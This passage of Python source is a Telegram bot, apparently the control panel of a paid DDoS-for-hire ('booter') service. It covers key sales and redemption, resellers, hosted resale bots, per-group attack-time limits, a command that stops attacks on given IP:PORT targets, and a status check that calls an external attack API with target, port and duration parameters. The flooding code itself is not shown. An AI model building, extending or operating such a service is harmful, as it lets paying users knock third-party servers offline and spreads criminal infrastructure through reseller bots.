    msg_txt += f"\n\n🌐 TOTAL GLOBAL: {total}/{MAX_CONCURRENT}"
    if uid in cooldown:
        rem = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if rem > 0:
            msg_txt += f"\n⏳ Your cooldown: {int(rem)}s"
    bot.reply_to(msg, msg_txt)

@bot.message_handler(commands=['genkey'])
def genkey_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or reseller only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /genkey 1 or /genkey 5h")
        return
    val, unit = parse_duration(args[1])
    if not val:
        bot.reply_to(msg, "❌ Invalid. Use 1 or 5h")
        return
    key = generate_key()
    expires = get_expiry_date(val, unit)
    keys_data[key] = {"user_id": "pending", "duration_value": val, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires.timestamp(), "used": False}
    save_keys(keys_data)
    bot.reply_to(msg, f"✅ KEY GENERATED!\n🔑 `{key}`\n⏰ {format_duration(val, unit)}\n📅 Expires: {expires.strftime('%d %b %Y, %I:%M %p')}\nUser: /redeem {key}")

@bot.message_handler(commands=['trialkey'])
def trialkey_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, "⚠️ Usage: /trialkey <prefix> <duration> <quantity>\nExample: /trialkey XSilent 1h 10\nDuration: 1h = 1 hour, 1 = 1 day\nQuantity max 100")
        return
    prefix, dur_str, qty_str = args[1], args[2], args[3]
    val, unit = parse_duration(dur_str)
    if not val:
        bot.reply_to(msg, "❌ Invalid duration. Use 1 or 5h")
        return
    try:
        qty = int(qty_str)
        if qty < 1 or qty > 100:
            bot.reply_to(msg, "❌ Quantity must be 1-100.")
            return
    except:
        bot.reply_to(msg, "❌ Invalid quantity.")
        return
    created = []
    for _ in range(qty):
        key = generate_key(prefix)
        expires = get_expiry_date(val, unit)
        keys_data[key] = {"user_id": "pending", "duration_value": val, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires.timestamp(), "used": False}
        created.append(key)
    save_keys(keys_data)
    expiry_str = expires.strftime('%d %b %Y, %I:%M %p')
    bot.reply_to(msg, f"✅ {qty} TRIAL KEYS GENERATED!\nPrefix: {prefix}\nDuration: {format_duration(val, unit)}\nExpires: {expiry_str}\n\nKeys:\n" + "\n".join(created))

@bot.message_handler(commands=['mykeys'])
def mykeys_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized.")
        return
    my = []
    for k, v in keys_data.items():
        if v.get("generated_by") == uid and not v.get("used"):
            exp = datetime.fromtimestamp(v["expires_at"]).strftime('%d %b %Y, %I:%M %p')
            my.append(f"🔑 {k}\n   {format_duration(v['duration_value'], v['duration_unit'])}\n   📅 {exp}")
    if my:
        bot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my))
    else:
        bot.reply_to(msg, "📋 No unused keys.")

@bot.message_handler(commands=['removekey'])
def removekey_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
        return
    key = args[1]
    if key in keys_data:
        del keys_data[key]
        save_keys(keys_data)
        bot.reply_to(msg, f"✅ Key {key} removed.")
    else:
        bot.reply_to(msg, "❌ Key not found.")

@bot.message_handler(commands=['add'])
def add_user_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /add USER_ID")
        return
    nu = args[1]
    if nu in ADMIN_ID or nu in users:
        bot.reply_to(msg, "❌ User already exists or is owner.")
        return
    users.append(nu)
    users_data["users"] = users
    save_users(users_data)
    bot.reply_to(msg, f"✅ User {nu} added.")

@bot.message_handler(commands=['remove'])
def remove_user_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /remove USER_ID")
        return
    ru = args[1]
    if ru in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner.")
        return
    if ru in users:
        users.remove(ru)
        users_data["users"] = users
        save_users(users_data)
        bot.reply_to(msg, f"✅ User {ru} removed.")
    else:
        bot.reply_to(msg, "❌ User not found.")

@bot.message_handler(commands=['addreseller'])
def add_reseller_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
        return
    rid = args[1]
    if rid in ADMIN_ID or rid in resellers:
        bot.reply_to(msg, "❌ Already a reseller or owner.")
        return
    resellers.append(rid)
    if rid not in users:
        users.append(rid)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, f"✅ Reseller {rid} added.")

@bot.message_handler(commands=['removereseller'])
def remove_reseller_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
        return
    rid = args[1]
    if rid in resellers:
        resellers.remove(rid)
        users_data["resellers"] = resellers
        save_users(users_data)
        bot.reply_to(msg, f"✅ Reseller {rid} removed.")
    else:
        bot.reply_to(msg, "❌ Not a reseller.")

@bot.message_handler(commands=['addgroup'])
def addgroup_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID SECONDS\nExample: /addgroup -100123456789 60")
        return
    gid = args[1]
    try:
        sec = int(args[2])
        if sec < 10 or sec > 300:
            bot.reply_to(msg, "❌ Seconds must be 10-300.")
            return
    except:
        bot.reply_to(msg, "❌ Invalid seconds.")
        return
    groups[gid] = {"attack_time": sec, "added_by": uid, "added_at": time.time()}
    save_groups(groups)
    bot.reply_to(msg, f"✅ Group {gid} added with max {sec}s attack time.")

@bot.message_handler(commands=['removegroup'])
def removegroup_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
        return
    gid = args[1]
    if gid in groups:
        del groups[gid]
        save_groups(groups)
        bot.reply_to(msg, f"✅ Group {gid} removed.")
    else:
        bot.reply_to(msg, "❌ Group not found.")

@bot.message_handler(commands=['allgroups'])
def allgroups_cmd(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    if not groups:
        bot.reply_to(msg, "📋 No groups.")
        return
    txt = "📋 ALL GROUPS:\n"
    for gid, info in groups.items():
        txt += f"👥 {gid}\n└ ⏱️ {info['attack_time']}s\n└ 👑 {info['added_by']}\n\n"
    bot.reply_to(msg, txt)

@bot.message_handler(commands=['host'])
def host_bot_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "⚠️ Usage: /host BOT_TOKEN OWNER_ID CONCURRENT NAME\nExample: /host 123:abc 8487946379 10 MONSTER")
        return
    token, oid, conc, name = args[1], args[2], args[3], args[4]
    try:
        conc = int(conc)
        if conc < 1 or conc > 20:
            bot.reply_to(msg, "❌ Concurrent must be 1-20.")
            return
    except:
        bot.reply_to(msg, "❌ Invalid concurrent value.")
        return
    hosted_bots[token] = {
        "owner_id": oid, "owner_name": name, "concurrent": conc, "max_attack_time": 300,
        "blocked": False, "active_attacks": {}, "users": []
    }
    save_hosted_bots(hosted_bots)
    if start_hosted_bot(token, oid, name, conc):
        bot.reply_to(msg, f"✅ Hosted bot @{name} started.\nToken: {token[:20]}...")
    else:
        bot.reply_to(msg, "❌ Failed to start hosted bot. Check token.")

@bot.message_handler(commands=['unhost'])
def unhost_bot_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /unhost BOT_TOKEN")
        return
    token = args[1]
    if token in hosted_bots or token in hosted_bot_instances:
        if token in hosted_bot_instances:
            try:
                hosted_bot_instances[token].stop_polling()
            except:
                pass
            del hosted_bot_instances[token]
        if token in hosted_bots:
            del hosted_bots[token]
        save_hosted_bots(hosted_bots)
        bot.reply_to(msg, f"✅ Hosted bot stopped.")
    else:
        bot.reply_to(msg, "❌ Hosted bot not found.")

@bot.message_handler(commands=['allhosts'])
def allhosts_cmd(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    if not hosted_bots:
        bot.reply_to(msg, "📋 No hosted bots.")
        return
    txt = "📋 HOSTED BOTS:\n"
    for token, info in hosted_bots.items():
        txt += f"🔑 {token[:20]}...\n└ 👑 {info['owner_name']} ({info['owner_id']})\n└ ⚡ {info['concurrent']}\n└ ⏱️ Max: {info.get('max_attack_time',300)}s\n\n"
    bot.reply_to(msg, txt)

@bot.message_handler(commands=['maintenance'])
def maintenance_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2 or args[1] not in ['on','off']:
        bot.reply_to(msg, "⚠️ Usage: /maintenance on/off")
        return
    global maintenance_mode
    maintenance_mode = (args[1] == 'on')
    bot.reply_to(msg, f"🔧 Maintenance mode {'ENABLED' if maintenance_mode else 'DISABLED'}")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    if not msg.reply_to_message:
        bot.reply_to(msg, "⚠️ Reply to a message to broadcast.")
        return
    success = 0
    for user in broadcast_users:
        try:
            bot.copy_message(user, msg.chat.id, msg.reply_to_message.message_id)
            success += 1
        except:
            pass
    bot.reply_to(msg, f"✅ Broadcast sent to {success} users.")

@bot.message_handler(commands=['stopattack'])
def stopattack_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /stopattack IP:PORT")
        return
    target = args[1]
    stopped = False
    for aid, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[aid]
            bot.reply_to(msg, f"✅ Stopped attack on {target}")
            stopped = True
            break
    if not stopped:
        for token, bot_info in hosted_bots.items():
            for aid, info in list(bot_info.get("active_attacks", {}).items()):
                if info["target_key"] == target:
                    del bot_info["active_attacks"][aid]
                    save_hosted_bots(hosted_bots)
                    bot.reply_to(msg, f"✅ Stopped attack on {target} (hosted bot)")
                    stopped = True
                    break
            if stopped:
                break
    if not stopped:
        bot.reply_to(msg, f"❌ No active attack on {target}")

@bot.message_handler(commands=['allusers'])
def allusers_cmd(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    txt = "📋 ALL USERS:\n"
    for u in users:
        role = "👑 OWNER" if u in ADMIN_ID else ("💎 RESELLER" if u in resellers else "👤 USER")
        txt += f"{role}: {u}\n"
    bot.reply_to(msg, txt + f"\nTotal: {len(users)}")

@bot.message_handler(commands=['api_status'])
def apistatus_cmd(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only.")
        return
    try:
        r = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=1&concurrent=1", timeout=5)
        status = "Online" if r.status_code == 200 else f"Error {r.status_code}"
    except:
        status = "Offline"
    bot.reply_to(msg, f"📡 API Status: {status}\n🎯 Active attacks: {get_total_active_count()}")

@bot.message_handler(commands=['redeem'])
def redeem_cmd(msg):
    uid = str(msg.chat.id)
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
        return
    key = args[1]
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key.")
        return
    info = keys_data[key]
    if info.get("used"):
        bot.reply_to(msg, "❌ Key already used.")
        return
    if time.time() > info["expires_at"]:
        bot.reply_to(msg, "❌ Key expired.")
        del keys_data[key]
        save_keys(keys_data)
        return
    if uid not in users:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    info["used"] = True
    info["used_at"] = time.time()
    info["used_by"] = uid
    save_keys(keys_data)
    expiry = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
    bot.reply_to(msg, f"✅ ACCESS GRANTED!\n🎉 Activated for {format_duration(info['duration_value'], info['duration_unit'])}\n📅 Expires: {expiry}\n⚡ Max Concurrent: {MAX_CONCURRENT}\n⏳ Cooldown: {COOLDOWN_TIME}s")

print("="*50)
print("✨ XSILENT BOT STARTED ✨")
print(f"👑 Owner: 8487946379")
print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
print(f"🌍 Max Attack Time: 300 seconds (MAX LIMIT)")
print(f"📊 Hosted Bots: {len(hosted_bots)}")
print(f"📅 Server Time: {format_ist_time(get_current_ist())}")
print("="*50)

bot.infinity_polling()
